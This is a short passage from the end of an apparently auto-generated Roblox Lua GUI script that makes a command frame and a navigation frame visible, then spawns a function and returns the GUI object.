			script.Parent.Parent.Parent.CommandFrame.Visible = true
			script.Parent.Parent.Parent.NavFrame.Visible = true
	end)
	
end;
task.spawn(C_517);

return G2L["1"], require;
